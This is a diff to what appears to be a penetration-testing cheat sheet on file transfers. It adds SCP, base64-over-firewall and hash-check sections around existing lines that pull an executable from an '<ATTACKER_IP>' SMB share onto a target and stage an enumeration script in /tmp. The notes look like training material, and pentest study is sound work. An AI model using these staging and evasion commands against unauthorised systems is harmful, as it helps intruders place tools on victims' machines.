@@ -208,7 +208,16 @@ impacket-smbserver share . -smb2support
 copy \\<ATTACKER_IP>\share\file.exe .
 ```
 
+### SCP
+```bash
+# Requires SSH credentials on the remote host
+scp linenum.sh user@<TARGET_IP>:/tmp/linenum.sh
+```
+Specify the local file first, then the remote destination after the colon.
+
 ### Base64 Transfer
+Useful when firewall rules or other restrictions block a direct file transfer. Encode the file on the attacker box, paste the string on the target, then decode it there.
+
 ```bash
 # Encode on attacker
 base64 -w 0 file.exe
@@ -219,6 +228,20 @@ echo "BASE64STRING" | base64 -d > file.exe
 # Decode on target (Windows)
 [System.Convert]::FromBase64String("BASE64STRING") | Set-Content file.exe -Encoding Byte
 ```
+
+### Validating File Transfers
+After transferring a file, confirm it arrived intact.
+
+```bash
+# Confirm file type/format
+file shell
+
+# Compare hashes on attacker and target
+md5sum shell
+```
+Run `md5sum` on both the local copy and the transferred copy. Matching hashes confirm the transfer, especially after base64 encode/decode, did not corrupt the file.
+
+For a deeper dive, see HTB Academy's File Transfers module.
 
 ---
 
